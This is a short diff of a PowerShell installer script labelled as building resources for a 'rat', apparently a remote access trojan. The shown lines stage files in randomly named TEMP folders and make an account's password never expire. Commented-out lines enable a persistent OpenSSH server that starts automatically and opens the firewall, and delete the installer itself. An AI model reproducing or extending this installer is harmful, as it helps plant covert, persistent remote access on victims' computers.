@@ -1,6 +1,9 @@
 # builds resources for rat
 # created by : jfrdgh (@bigmanlc on dc)
 
+$pocpath = "$env:TEMP/poc"
+mkdir $pocpath
+
 # random string for directories
 function random_text {
     return -join ((65..90) + (97..122) | Get-Random -Count 5 | %  {[char]$_})
@@ -48,7 +51,6 @@ Write-Host "Ensuring password for $Username never expires."
 $wd = random_text
 $path = "$env:TEMP/$wd"
 $initial_dir = Get-Location
-$pocpath = "$env:TEMP/poc"
 
 # enabling persistant ssh
 # Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service sshd Set-Service -Name sshd -StartupType 'Automatic' Get-NetFirewallRule -Name *ssh*
@@ -59,4 +61,3 @@ mkdir $path
 
 # cd $initial_dir
 # del installer.ps1
-pause
